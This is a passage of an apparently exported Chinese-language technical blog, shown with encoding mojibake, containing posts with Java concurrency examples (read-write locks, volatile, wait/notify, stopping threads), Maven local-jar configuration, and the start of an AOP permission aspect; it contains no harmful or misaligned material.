readWriteLock.getMutex().notifyAll(); } } }æ“ä½œæ•°æ®æ¥å£import java.util.ArrayList; import java.util.List; import java.util.concurrent.TimeUnit; /** * @author husky * @date 2019/8/29 17:12 */ public class ShareData { /**å®šä¹‰å…±äº«æ•°æ®(èµ„æº)*/ private final List&lt;Character&gt; container = new ArrayList&lt;&gt;(); /**æ„é€ ReadWriteLock*/ private final ReadWriteLock readWriteLock = ReadWriteLock.readWriteLock(); /**åˆ›å»ºè¯»å–é”*/ private final Lock readLock = readWriteLock.readLock(); /**åˆ›å»ºå†™å…¥é”*/ private final Lock writeLock = readWriteLock.writeLock(); private final int length; public ShareData(int length){ this.length = length; for(int i = 0;i &lt; length;i++){ container.add(i,&apos;c&apos;); } } public char[] read() throws InterruptedException{ try{ //é¦–å…ˆè¿›è¡Œè¯»é”è¿›è¡Œlock readLock.lock(); char[] newBuffer = new char[length]; for(int i = 0;i &lt; length;i++){ newBuffer[i] = container.get(i); } slowly(); return newBuffer; }finally { //å½“è¯»å–æ“ä½œç»“æŸå,é‡Šæ”¾é” readLock.unlock(); } } public void write(char c) throws InterruptedException{ try{ writeLock.lock(); for(int i = 0;i &lt; length;i++){ this.container.add(i,c); } slowly(); }finally { writeLock.unlock(); } } public void slowly(){ try{ TimeUnit.SECONDS.sleep(1); }catch (InterruptedException e){ e.printStackTrace(); } } }æµ‹è¯•ç±»import static java.lang.Thread.currentThread; /** * @author husky * @date 2019/8/29 17:12 */ public class ReadWriteLockTest { /**this is the example for read write lock*/ private final static String text = &quot;Thisistheexampleforreadwritelock&quot;; public static void main(String[] args) { //å®šä¹‰å…±äº«æ•°æ® final ShareData shareData = new ShareData(50); //åˆ›å»ºä¸¤ä¸ªçº¿ç¨‹è¿›è¡Œæ•°æ®å†™æ“ä½œ for(int i = 0;i &lt; 2;i++){ new Thread(()-&gt;{ for(int index = 0;index &lt; text.length();index++){ try{ char c = text.charAt(index); shareData.write(c); System.out.println(currentThread()+&quot; write &quot; + c); }catch (InterruptedException e){ e.printStackTrace(); } } }).start(); } //åˆ›å»º10ä¸ªçº¿ç¨‹è¿›è¡Œæ•°æ®è¯»æ“ä½œ for(int i = 0;i &lt; 10;i++){ new Thread(()-&gt;{ while(true){ try { System.out.println(currentThread() + &quot; read &quot; + new String(shareData.read())); } catch (InterruptedException e) { e.printStackTrace(); } } }).start(); } }æ€»ç»“ ReentrantReadWriteLockçš„æ“ä½œæµç¨‹å’Œä¸Šé¢çš„æ“ä½œç›¸ä¼¼,å…·ä½“ç”¨åˆ°åç»­å†èŠ è¯»å†™é”åº”ç”¨åœºæ™¯å¯ä»¥åœ¨ç¼“å­˜éƒ¨åˆ†æˆ–è€…åœ¨ä¸€äº›é›†åˆç±»ä¸­ä½¿ç”¨","categories":[],"tags":[{"name":"Javaå¹¶å‘","slug":"Javaå¹¶å‘","permalink":"http://yoursite.com/tags/Java%E5%B9%B6%E5%8F%91/"},{"name":"è¯»å†™é”","slug":"è¯»å†™é”","permalink":"http://yoursite.com/tags/%E8%AF%BB%E5%86%99%E9%94%81/"}]},{"title":"volatileå…³é”®å­—","slug":"volatileå…³é”®å­—","date":"2019-08-21T10:34:08.000Z","updated":"2020-11-14T17:10:57.832Z","comments":true,"path":"2019/08/21/volatileå…³é”®å­—/","link":"","permalink":"http://yoursite.com/2019/08/21/volatile%E5%85%B3%E9%94%AE%E5%AD%97/","excerpt":"","text":"å†…å­˜,cache,å’Œå¯„å­˜å™¨ä¹‹é—´çš„å…³ç³»å¯„å­˜å™¨æ˜¯ç”¨äºè®¡ç®—æ•°æ®,è€Œcpuæ‰€èƒ½è®¿é—®çš„æ•°æ®éƒ½æ˜¯ä¸»å­˜ä¸­çš„.å¯„å­˜å™¨é€Ÿåº¦éšæ—¶ä»£è¡Œé•¿è¶Šæ¥è¶Šå¿«,ä½†æ˜¯è¯»å–æ•°æ®å´æ˜¯æ²¡æœ‰å¤ªå¤§å‘å±•.æ‰€ä»¥æœ‰äº†cacheè¿™æ ·çš„ä¸œè¥¿ é«˜å¹¶å‘ä¸‰å¤§ç‰¹æ€§ åŸå­æ€§ å¤šä¸ªåŸå­æ€§æ“ä½œåœ¨ä¸€èµ·å°±ä¸å†æ˜¯åŸå­æ€§æ“ä½œäº† ç®€å•çš„è¯»å–å’Œèµ‹å€¼æ“ä½œæ˜¯åŸå­æ€§çš„,å°†ä¸€ä¸ªå˜é‡èµ‹ç»™å¦å¤–ä¸€ä¸ªå˜é‡çš„æ“ä½œä¸æ˜¯åŸå­æ€§çš„. Javaå†…å­˜æ¨¡å‹(JMM)åªä¿è¯äº†åŸºæœ¬è¯»å–å’Œèµ‹å€¼çš„åŸå­æ€§æ“ä½œ,å…¶ä»–å‡ä¸ä¿è¯,å¦‚æœéœ€è¦æŸäº›ä»£ç å—èƒ½å¤Ÿæ‹¥æœ‰åŸå­æ€§,éœ€è¦ä½¿ç”¨å…³é”®å­—synchronized,æˆ–è€…JUCä¸­çš„lock.å¦‚æœæƒ³è¦ä½¿ç”¨intç­‰ç±»å‹è‡ªå¢æ“ä½œå…·å¤‡åŸå­æ€§,å¯ä»¥ä½¿ç”¨JUCåŒ…ä¸‹çš„åŸå­å°è£…ç±»å‹java.util.concurrent.atomic.* æ€»ç»“:volatileå…³é”®å­—ä¸å…·å¤‡åŸå­æ€§çš„è¯­ä¹‰,éœ€è¦synchronizedæˆ–è€…lock å¯è§æ€§ ä½¿ç”¨volatile,å½“ä¸€ä¸ªå˜é‡è¢«volatileå…³é”®å­—ä¿®é¥°æ—¶,å¯¹äºå…±äº«èµ„æºçš„è¯»æ“ä½œä¼šç›´æ¥åœ¨ä¸»å†…å­˜ä¸­è¿›è¡Œ,å¯¹äºå…±äº«èµ„æºçš„å†™æ“ä½œå½“ç„¶æ˜¯å…ˆä¿®æ”¹å·¥ä½œå†…å­˜,ä½†æ˜¯ä¿®æ”¹ç»“æŸå,ä¼šç«‹åˆ»åˆ·æ–°åˆ°ä¸»å†…å­˜ä¸­. é€šè¿‡synchronizedå…³é”®å­—èƒ½å¤Ÿä¿è¯å¯è§æ€§,synchronizedå…³é”®å­—èƒ½å¤Ÿä¿è¯åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹è·å¾—é”,ç„¶åæŒ‡å‘åŒæ­¥æ–¹æ³•,å¹¶ä¸”è¿˜ä¼šç¡®ä¿åœ¨é”é‡Šæ”¾ä¹‹å‰,ä¼šå°†å¯¹å˜é‡çš„ä¿®æ”¹åˆ·æ–°åˆ°ä¸»å†…å­˜ä¸­. é€šè¿‡JUCæä¾›çš„æ˜¾ç¤ºé”Lockä¹Ÿèƒ½å¤Ÿä¿è¯å¯è§æ€§,Lockçš„lockæ–¹æ³•èƒ½å¤Ÿä¿è¯åœ¨åŒä¸€ä¸ªæ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹è·å–é”ç„¶åæ‰§è¡ŒåŒæ­¥æ–¹æ³•,å¹¶ç¡®ä¿åœ¨é”é‡Šæ”¾ä¹‹å‰å°†å¯¹å˜é‡çš„ä¿®æ”¹åˆ·æ–°åˆ°ä¸»å†…å­˜ä¸­. æœ‰åºæ€§ ä½¿ç”¨volatileå…³é”®å­—æ¥ä¿è¯æœ‰åºæ€§ ä½¿ç”¨synchronizedå…³é”®å­—æ¥ä¿è¯æœ‰åºæ€§ ä½¿ç”¨Lockæ¥ä¿è¯æœ‰åºæ€§ æ€»ç»“:volatileå¯ä»¥å®ç°å¯è§æ€§,æœ‰åºæ€§,ä½†æ˜¯ä¸å¯å®ç°åŸå­æ€§ volatileå’Œsynchronized ä½¿ç”¨ä¸Šçš„åŒºåˆ« volatileå…³é”®å­—åªèƒ½ç”¨äºä¿®é¥°å®ä¾‹å˜é‡æˆ–è€…ç±»å˜é‡,ä¸èƒ½ä¿®é¥°æ–¹æ³•ä»¥åŠæ–¹æ³•å‚æ•°å’Œå±€éƒ¨å˜é‡,å¸¸é‡ç­‰ synchronizedå…³é”®å­—ä¸èƒ½ç”¨äºå¯¹å˜é‡çš„ä¿®é¥°,åªèƒ½ç”¨äºä¿®é¥°æ–¹æ³•æˆ–è€…è¯­å¥å— volatileä¿®é¥°çš„å˜é‡å¯ä»¥ä¸ºnull,synchronizedå…³é”®å­—åŒæ­¥è¯­å¥æ¡†çš„monitorå¯¹è±¡ä¸èƒ½ä¸ºnull å¯¹åŸå­æ€§çš„ä¿è¯ volatileæ— æ³•ä¿è¯åŸå­æ€§ ç”±äºsynchronizedæ˜¯ä¸€ç§æ’ä»–çš„æœºåˆ¶,å› æ­¤è¢«synchronizedå…³é”®å­—ä¿®é¥°çš„åŒæ­¥ä»£ç æ— æ³•è¢«ä¸­æ–­æ‰“æ–­,å› æ­¤èƒ½å¤Ÿä¿è¯ä»£ç çš„åŸå­æ€§ å¯è§æ€§çš„ä¿è¯ ä¸¤è€…å‡å¯ä»¥ä¿è¯å…±äº«èµ„æºåœ¨å¤šçº¿ç¨‹é—´çš„å¯è§æ€§,ä½†æ˜¯å®ç°æœºåˆ¶å®Œå…¨ä¸åŒ. synchronizedå€ŸåŠ©äºJVMæŒ‡ä»¤monitor enterå’Œmonitor exitå¯¹é€šè¿‡æ’ä»–çš„æ–¹å¼ä½¿å¾—åŒæ­¥ä»£ç ä¸²è¡ŒåŒ–,åœ¨monitor exitæ—¶æ‰€æœ‰å…±äº«æ•°æ®éƒ½ä¼šè¢«åˆ·æ–°åˆ°ä¸»å†…å­˜ä¸­. ç›¸è¾ƒä¸synchronizedå…³é”®å­—volatileä½¿ç”¨æœºå™¨æŒ‡ä»¤(åç¡¬ä»¶)â€lock;â€çš„æ–¹å¼è¿«ä½¿å…¶ä»–çº¿ç¨‹å·¥ä½œå†…å­˜ä¸­çš„æ•°æ®å¤±æ•ˆ,ä¸å¾—åˆ°ä¸»å†…å­˜ä¸­è¿›è¡Œå†æ¬¡åŠ è½½. æœ‰åºæ€§çš„ä¿è¯ volatileå…³é”®å­—ç¦æ­¢JVMç¼–è¯‘å™¨ä»¥åŠå¤„ç†å™¨å¯¹å…¶è¿›è¡Œé‡æ’åº,æ‰€ä»¥å®ƒèƒ½å¤Ÿä¿è¯æœ‰åºæ€§ è™½ç„¶synchronizedå…³é”®å­—æ‰€ä¿®é¥°çš„åŒæ­¥æ–¹æ³•ä¹Ÿå¯ä»¥ä¿è¯é¡ºåºæ€§,ä½†æ˜¯è¿™ç§é¡ºåºæ€§æ˜¯ä»¥ç¨‹åºçš„ä¸²è¡ŒåŒ–æ¢æ¥çš„,åœ¨synchronizedå…³é”®å­—æ‰€ä¿®é¥°çš„ä»£ç å—ä¸­ä»£ç å—ä»£ç æŒ‡ä»¤ä¹Ÿå‘ç”ŸæŒ‡ä»¤é‡æ’åºçš„æƒ…å†µ å…¶ä»– volatileä¸ä¼šä½¿çº¿ç¨‹é™·å…¥é˜»å¡ synchronizedå…³é”®å­—ä¼šä½¿çº¿ç¨‹è¿›å…¥é˜»å¡çŠ¶æ€.","categories":[],"tags":[{"name":"Javaå¹¶å‘","slug":"Javaå¹¶å‘","permalink":"http://yoursite.com/tags/Java%E5%B9%B6%E5%8F%91/"},{"name":"voliate","slug":"voliate","permalink":"http://yoursite.com/tags/voliate/"}]},{"title":"springbootå¯¼å…¥æœ¬åœ°jaråŒ…","slug":"springbootå¯¼å…¥æœ¬åœ°jaråŒ…","date":"2019-08-15T10:35:22.000Z","updated":"2020-11-14T17:10:58.334Z","comments":true,"path":"2019/08/15/springbootå¯¼å…¥æœ¬åœ°jaråŒ…/","link":"","permalink":"http://yoursite.com/2019/08/15/springboot%E5%AF%BC%E5%85%A5%E6%9C%AC%E5%9C%B0jar%E5%8C%85/","excerpt":"","text":"springbootå¯¼å…¥æœ¬åœ°jaråŒ…é¦–å…ˆåœ¨srcä¸‹å»ºç›®å½•lib,å¹¶å°†éœ€è¦çš„æœ¬åœ°jaråŒ…æ”¾å…¥ åœ¨pom.xmlä¸‹ä¿®æ”¹å¦‚ä¸‹ &lt;!-- å¯¼å…¥äº‘é¡¿æ•°æ®é£æ§çš„jar --&gt; &lt;dependency&gt; &lt;groupId&gt;aliyun&lt;/groupId&gt; &lt;artifactId&gt;aliyun-java-sdk-afs&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt; &lt;scope&gt;system&lt;/scope&gt; &lt;systemPath&gt;${basedir}/src/lib/aliyun-java-sdk-afs-1.0.0.jar&lt;/systemPath&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;aliyun&lt;/groupId&gt; &lt;artifactId&gt;aliyun-java-sdk-core&lt;/artifactId&gt; &lt;version&gt;3.0.6&lt;/version&gt; &lt;scope&gt;system&lt;/scope&gt; &lt;systemPath&gt;${basedir}/src/lib/aliyun-java-sdk-core-3.0.6.jar&lt;/systemPath&gt; &lt;/dependency&gt; &lt;!-- å¯¼å…¥äº‘é¡¿æ•°æ®é£æ§çš„jar END--&gt;æ‰“åŒ…ä¿®æ”¹pluginä¸­,æ·»åŠ é…ç½® &lt;includeSystemScope&gt;true&lt;/includeSystemScope&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;includeSystemScope&gt;true&lt;/includeSystemScope&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;å¯èƒ½å‡ºç°çš„warning[WARNING] Some problems were encountered while building the effective model for com.seniortech:beauty-hair-cms:jar:1.0.0 [WARNING] &apos;dependencies.dependency.systemPath&apos; for aliyun:aliyun-java-sdk-afs:jar should not point at files within the project directory, ${basedir}/src/lib/aliyun-java-sdk-afs-1.0.0.jar will be unresolvable by dependent projects @ line 111, column 25 [WARNING] &apos;dependencies.dependency.systemPath&apos; for aliyun:aliyun-java-sdk-core:jar should not point at files within the project directory, ${basedir}/src/lib/aliyun-java-sdk-core-3.0.6.jar will be unresolvable by dependent projects @ line 118, column 25 [WARNING] [WARNING] It is highly recommended to fix these problems because they threaten the stability of your build. è§£å†³æ–¹æ³•,Use ${pom.basedir} instead of ${project.basedir}. ä¿®æ”¹åçš„pom&lt;!-- å¯¼å…¥äº‘é¡¿æ•°æ®é£æ§çš„jar --&gt; &lt;dependency&gt; &lt;groupId&gt;aliyun&lt;/groupId&gt; &lt;artifactId&gt;aliyun-java-sdk-afs&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt; &lt;scope&gt;system&lt;/scope&gt; &lt;systemPath&gt;${pom.basedir}/src/lib/aliyun-java-sdk-afs-1.0.0.jar&lt;/systemPath&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;aliyun&lt;/groupId&gt; &lt;artifactId&gt;aliyun-java-sdk-core&lt;/artifactId&gt; &lt;version&gt;3.0.6&lt;/version&gt; &lt;scope&gt;system&lt;/scope&gt; &lt;systemPath&gt;${pom.basedir}/src/lib/aliyun-java-sdk-core-3.0.6.jar&lt;/systemPath&gt; &lt;/dependency&gt; &lt;!-- å¯¼å…¥äº‘é¡¿æ•°æ®é£æ§çš„jar END--&gt;","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"maven","slug":"maven","permalink":"http://yoursite.com/tags/maven/"},{"name":"æ‰“åŒ…","slug":"æ‰“åŒ…","permalink":"http://yoursite.com/tags/%E6%89%93%E5%8C%85/"}]},{"title":"çº¿ç¨‹é€šä¿¡","slug":"çº¿ç¨‹é€šä¿¡","date":"2019-07-16T10:24:44.000Z","updated":"2020-11-14T17:10:58.970Z","comments":true,"path":"2019/07/16/çº¿ç¨‹é€šä¿¡/","link":"","permalink":"http://yoursite.com/2019/07/16/%E7%BA%BF%E7%A8%8B%E9%80%9A%E4%BF%A1/","excerpt":"","text":"çº¿ç¨‹é—´é€šä¿¡ çº¿ç¨‹é—´é€šä¿¡ä¼šæœ‰ä¸€ä¸ªå­˜å‚¨ä»»åŠ¡çš„é˜Ÿåˆ—,é˜Ÿåˆ—æœ‰ä»¥ä¸‹ä¸‰ç§çŠ¶å†µ é˜Ÿåˆ—ä¸ºç©º,ä¼šé€šçŸ¥æ¶ˆè´¹è€…ç­‰å¾…, é˜Ÿåˆ—æ»¡æ—¶,ä¼šé€šçŸ¥ç”Ÿäº§è€…ç­‰å¾… é˜Ÿåˆ—æœ‰ä»»åŠ¡ä½†ä¸ä¸ºç©º,æ¶ˆè´¹è€…æ­£å¸¸è¿è¡Œ,ç”Ÿäº§è€…æ­£å¸¸è¿è¡Œ å•çº¿ç¨‹é€šä¿¡(ä¸€ä¸ªç”Ÿäº§è€…ä¸€ä¸ªæ¶ˆè´¹è€…) ä½¿ç”¨ Object ä¸­çš„æ–¹æ³•, wait() å’Œ notify() æ¥å®ç° wait() wait() å’Œ notify() å¿…é¡»è·å–å¯¹è±¡,æ‰€ä»¥ä¸¤ä¸ªæ–¹æ³•éƒ½éœ€è¦åœ¨åŒæ­¥æ–¹æ³•ä¸­ä½¿ç”¨( synchroized ) å½“å‰çº¿ç¨‹æ‰§è¡Œäº†è¯¥å¯¹è±¡çš„ wait æ–¹æ³•ä¹‹å,å°†ä¼šæ”¾å¼ƒå¯¹è¯¥monitorçš„æ‰€æœ‰æƒå¹¶ä¸”è¿›å…¥ä¸è¯¥å¯¹è±¡å…³è”çš„ wait set ä¸­,ä¹Ÿå°±æ˜¯è¯´,ä¸€æ—¦å½“å‰çº¿ç¨‹æ‰§è¡Œäº†æŸä¸ª object çš„ wait æ–¹æ³•ä¹‹å,å®ƒå°±ä¼šé‡Šæ”¾å¯¹è¯¥å¯¹è±¡monitorçš„æ‰€æœ‰æƒ,å…¶ä»–çº¿ç¨‹ä¹Ÿä¼šæœ‰æœºä¼šç»§ç»­äº‰å¤ºè¯¥monitorçš„æ‰€æœ‰æƒ notify() notify() ä¼šå”¤é†’å•ä¸ªæ­£åœ¨æ‰§è¡Œè¯¥å¯¹è±¡çš„waitæ–¹æ³•çš„çº¿ç¨‹ å”¤é†’çš„çº¿ç¨‹éœ€è¦é‡æ–°è·å–å¯¹è¯¥å¯¹è±¡æ‰€å…³è”monitorçš„lockæ‰èƒ½æ‰§è¡Œ import java.util.LinkedList; /** * EventQuque ä»»åŠ¡é˜Ÿåˆ—,æä¾›æ·»åŠ ä»»åŠ¡æ–¹æ³•,æ¶ˆè´¹æ–¹æ³•. * @author husky * @date 2019/7/12 11:21 */ public class EventQueue { private final int max; static class Event{ } private final LinkedList&lt;Event&gt; events = new LinkedList&lt;&gt;(); private final static Integer DEDAULT_MAX_EVENT = 10; public EventQueue(int max) { this.max = max; } public EventQueue(){ this(DEDAULT_MAX_EVENT); } public void offer(Event event){ synchronized (events){ if(events.size() &gt;= DEDAULT_MAX_EVENT){ try { console(&quot;the event list is full,wait consumer consume&quot;); events.wait(); } catch (InterruptedException e) { e.printStackTrace(); } } console(&quot;the event is submit&quot;); events.addLast(event); events.notify(); } } public void take(){ synchronized (events){ if(events.size() &lt;= 0){ try { console(&quot;the event list is empty,wait producer produce&quot;); events.wait(); } catch (InterruptedException e) { e.printStackTrace(); } } Event eventFirst = events.getFirst(); events.removeFirst(); console(&quot;Event is &quot; + eventFirst + &quot;handler&quot;); events.notify(); } } public static void console(String msg){ System.out.println(msg); } } import java.util.concurrent.TimeUnit; /** * EventClient ä½¿ç”¨ * @author husky * @date 2019/7/12 11:44 */ public class EventClient { public static void main(String[] args) { final EventQueue eventQueue = new EventQueue(); new Thread(()-&gt;{ for(;;){ eventQueue.offer(new EventQueue.Event()); } },&quot;producer&quot;).start(); new Thread(()-&gt;{ for(;;){ eventQueue.take(); //æ¨¡æ‹Ÿæ¶ˆè´¹eventæ¶ˆè€—æ—¶é—´ try { TimeUnit.MICROSECONDS.sleep(10); } catch (InterruptedException e) { e.printStackTrace(); } } },&quot;consumer&quot;).start(); }å¤šçº¿ç¨‹é€šä¿¡(å¤šç”Ÿæˆè€…å¤šæ¶ˆè´¹è€…) notifyAll() æ–¹æ³•å¯ä»¥å”¤é†’ç”±äºè°ƒç”¨ wait() æ–¹æ³•é˜»å¡çš„çº¿ç¨‹, notify() å¯ä»¥å”¤é†’èµ·ä¸€ä¸ªçº¿ç¨‹,è€Œ notifyAll() æ˜¯å”¤é†’æ‰€æœ‰é˜»å¡çš„çº¿ç¨‹,æ‰€æœ‰çº¿ç¨‹éœ€è¦ç«äº‰monitorçš„é”. import java.util.LinkedList; /** * EventQueue ä»»åŠ¡é˜Ÿåˆ— * @author husky * @date 2019/7/12 14:17 * å¤šçº¿ç¨‹é—´é€šä¿¡ */ public class EventQueue { private final int max; static class Event{ } private final LinkedList&lt;Event&gt; events = new LinkedList&lt;&gt;(); private final static Integer DEDAULT_MAX_EVENT = 10; public EventQueue(int max) { this.max = max; } public EventQueue(){ this(DEDAULT_MAX_EVENT); } public void offer(Event event){ synchronized (events){ while(events.size() &gt;= DEDAULT_MAX_EVENT){ try { console(&quot;the event list is full,wait consumer consume&quot;); events.wait(); } catch (InterruptedException e) { e.printStackTrace(); } } console(Thread.currentThread().getName()+&quot;the event is submit&quot;); events.addLast(event); events.notifyAll(); } } public void take(){ synchronized (events){ while(events.size() &lt;= 0){ try { console(&quot;the event list is empty,wait producer produce&quot;); events.wait(); } catch (InterruptedException e) { e.printStackTrace(); } } Event eventFirst = events.getFirst(); events.removeFirst(); console(Thread.currentThread().getName()+&quot;Event is &quot; + eventFirst + &quot;handler&quot;); events.notifyAll(); } } public static void console(String msg){ System.out.println(msg); } } import java.util.concurrent.TimeUnit; import java.util.stream.IntStream; /** * @author husky * @date 2019/7/12 14:19 */ public class EventClient { public static void main(String[] args) { final EventQueue eventQueue = new EventQueue(); IntStream.rangeClosed(0,2).mapToObj(i-&gt;new Thread(&quot;producer-&quot;+i){ @Override public void run() { for(;;) { eventQueue.offer(new EventQueue.Event()); } } }).forEach(Thread::start); IntStream.rangeClosed(0,3).mapToObj(i-&gt;new Thread(&quot;consumer-&quot;+i){ @Override public void run() { for(;;){ eventQueue.take(); try { TimeUnit.MICROSECONDS.sleep(10); } catch (InterruptedException e) { e.printStackTrace(); } } } }).forEach(Thread::start); } } å…¶ä¸­éœ€è¦è§£é‡Šçš„æ˜¯,ä¸ºä»€ä¹ˆå•çº¿ç¨‹é€šä¿¡åœ¨åˆ¤æ–­æ˜¯å¦é˜»å¡æ—¶,ä½¿ç”¨if,è€Œå¤šçº¿ç¨‹åˆ¤æ–­ä½¿ç”¨while.å› ä¸ºå¤šä¸ªåœ¨ä¸€èµ·æ—¶,æœ‰å¯èƒ½å¤šä¸ªåŒæ—¶é˜»å¡,è¢«å”¤é†’æ—¶,å¦‚æœç”¨ifçš„è¯,å¾ˆå¤šæ¡ä»¶å¹¶æ²¡æœ‰å†æ¬¡åˆ¤æ–­. è€Œä½¿ç”¨whileå¯ä»¥åœ¨æ‰§è¡Œ wait() ä¹‹åå†æ¬¡åˆ¤æ–­æ¡ä»¶æ˜¯å¦æ­£ç¡®,è¿™é‡Œä¹Ÿå°±ç‰µæ‰¯åˆ°wait setçš„äº‹æƒ…","categories":[],"tags":[{"name":"Javaå¹¶å‘","slug":"Javaå¹¶å‘","permalink":"http://yoursite.com/tags/Java%E5%B9%B6%E5%8F%91/"},{"name":"çº¿ç¨‹é€šä¿¡","slug":"çº¿ç¨‹é€šä¿¡","permalink":"http://yoursite.com/tags/%E7%BA%BF%E7%A8%8B%E9%80%9A%E4%BF%A1/"}]},{"title":"å…³é—­çº¿ç¨‹","slug":"å…³é—­çº¿ç¨‹","date":"2019-07-12T09:27:41.000Z","updated":"2020-11-14T17:10:59.765Z","comments":true,"path":"2019/07/12/å…³é—­çº¿ç¨‹/","link":"","permalink":"http://yoursite.com/2019/07/12/%E5%85%B3%E9%97%AD%E7%BA%BF%E7%A8%8B/","excerpt":"","text":"å…³é—­çº¿ç¨‹é€šè¿‡ interruptionException å…³é—­import java.util.concurrent.TimeUnit; /** * @author husky * @date 2019/7/11 11:23 */ public class CloseThreadByInterruptException { public static void main(String[] args) { Thread workThread = new Thread(){ @Override public void run() { System.out.println(&quot;i will start work&quot;); for(;;){ //working //ä½¿ç”¨æ—¶é—´æ¨¡æ‹Ÿå·¥ä½œ long start = System.currentTimeMillis(); long end = start + 1000 * 5; while(System.currentTimeMillis() &lt;= end){ //do nothing } try{ TimeUnit.MICROSECONDS.sleep(1); }catch (InterruptedException e){ break; } } System.out.println(&quot;i will be exiting&quot;); } }; workThread.start(); try { TimeUnit.SECONDS.sleep(1); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(&quot;work thread will be closed&quot;); workThread.interrupt(); } }é€šè¿‡ interrupt statusimport java.util.concurrent.TimeUnit; /** * @author husky * @date 2019/7/11 11:16 */ public class CloseThreadByInterruptStatus { public static void main(String[] args) throws InterruptedException { Thread t1 = new Thread(){ @Override public void run() { while(!isInterrupted()){ //do something } } }; t1.start(); // ensure thread is running TimeUnit.SECONDS.sleep(1); System.out.println(&quot;Thread will be closed&quot;); t1.interrupt(); } }é€šè¿‡ volatile å’Œ interrupt status å…³é—­import java.util.concurrent.TimeUnit; /** * @author husky * @date 2019/7/11 11:39 */ public class CloseThreadByVolatile { static class WorkThread extends Thread{ private volatile boolean flag = false; @Override public void run() { System.out.println(&quot;i will start work&quot;); while(!flag&amp;&amp;!isInterrupted()){ //æ­£åœ¨æ‰§è¡Œ } System.out.println(&quot;i will be exiting&quot;); } public void close(){ this.flag = true; this.interrupt(); } } public static void main(String[] args) { WorkThread workThread = new WorkThread(); workThread.start(); try { TimeUnit.SECONDS.sleep(1); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(&quot;System will be interrupt&quot;); workThread.close(); } }æ€»ç»“ interrupt statuså®¹æ˜“è¢«æ¸…é™¤,æ‰€ä»¥æ¨èä½¿ç”¨voliateå’Œinterrupt statusæ··åˆä½¿ç”¨ è¯¥æ–‡å­¦ä¹ äºæ±ªæ–‡å›é«˜å¹¶å‘ç¼–ç¨‹","categories":[],"tags":[{"name":"Javaå¹¶å‘","slug":"Javaå¹¶å‘","permalink":"http://yoursite.com/tags/Java%E5%B9%B6%E5%8F%91/"},{"name":"thread","slug":"thread","permalink":"http://yoursite.com/tags/thread/"}]},{"title":"aop+annotationå®ç°æƒé™ç®¡ç†","slug":"aop+annotationå®ç°æƒé™ç®¡ç†","date":"2019-06-24T14:43:17.000Z","updated":"2020-11-14T17:11:00.301Z","comments":true,"path":"2019/06/24/aop+annotationå®ç°æƒé™ç®¡ç†/","link":"","permalink":"http://yoursite.com/2019/06/24/aop+annotation%E5%AE%9E%E7%8E%B0%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/","excerpt":"","text":"åŠŸèƒ½éœ€æ±‚é‡åˆ°ä¸€ä¸ªé—®é¢˜,è¦å®ç°æƒé™ç®¡ç†,ä¹Ÿå°±æ˜¯æœ‰äº›æŒ‰é’®ç‚¹å‡»æ—¶è¦æç¤º,æ²¡æœ‰æƒé™,æœ‰å¾ˆå¤šæ¥å£,å¦‚æœè¦æ˜¯æŒ‰ç…§è€çš„æ–¹å¼,å°±æ˜¯æ¯ä¸ªæ–¹æ³•éƒ½æ‰‹å†™æƒé™åˆ¤æ–­.ååˆ†æµªè´¹æ—¶é—´ é—®é¢˜çš„é‡è¦ç‚¹ é‡å¤çš„å·¥ä½œ,å¦‚ä½•è§£å†³ é¡¹ç›®å¹¶æ²¡æœ‰å¼•å…¥shiroä¹‹ç±»çš„æ¨¡å—è€Œä¸”sessionæ˜¯ä¿å­˜åœ¨redisä¸­çš„,æ‰€ä»¥åˆ†å¸ƒå¼çš„ç¯å¢ƒä¹Ÿå¯ä½¿ç”¨session,å¦‚ä½•ä»sessionä¸­è·å–ç”¨æˆ·ä¿¡æ¯ è¯ä¸å¤šå°‘,ç›´æ¥è¯´æ€ä¹ˆåš é‡‡ç”¨aopå®ç°é‡å¤çš„æƒé™åˆ¤æ–­ æ ¹æ®RequestContextHolderè¿™ä¸ªç±»å¯ä»¥è·å–session Permissionæ³¨è§£import java.lang.annotation.*; @Inherited @Retention(RetentionPolicy.RUNTIME) @Target({ElementType.METHOD}) /** * æ­¤å¤„åœ¨ä½¿ç”¨æ—¶,å¯ä»¥åœ¨æ–¹æ³•ä¸Šé¢åŠ æ³¨è§£ * example: @Permission({&quot;/admin/hasPermission&quot;,&quot;/admin/isAlive&quot;}) * */ public @interface Permission { String[] value() default {}; }PermissionAopimport com.seniortech.test.annotation.Permission; import com.seniortech.test.entity.Admin; import com.seniortech.test.response.LayData; import com.seniortech.test.service.PermissionService; import org.aspectj.lang.ProceedingJoinPoint; import org.aspectj.lang.annotation.Around; import org.aspectj.lang.annotation.Aspect; import org.aspectj.lang.annotation.Pointcut; import org.springframework.context.annotation.Configuration; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.context.request.ServletRequestAttributes; import org.aspectj.lang.reflect.MethodSignature; import javax.annotation.Resource; import javax.servlet.http.HttpSession; import java.lang.reflect.Method; import java.util.Objects; /** * @author husky * @date 2019/6/24 17:46 */ @Aspect @Configuration public class PermissionAop { @Resource private PermissionService permissionService; // å®šä¹‰åˆ‡ç‚¹Pointcut @Pointcut(value=&quot;@annotation(com.seniortech.test.annotation.Permission)&quot;) public void excudeService(){ } @Around(&quot;excudeService()&quot;) public Object doAround(ProceedingJoinPoint proceedingJoinPoint) throws Throwable { HttpSession session = ((ServletRequestAttributes)RequestContextHolder.getRequestAttributes()).getRequest().getSession(); Admin admin =(Admin) 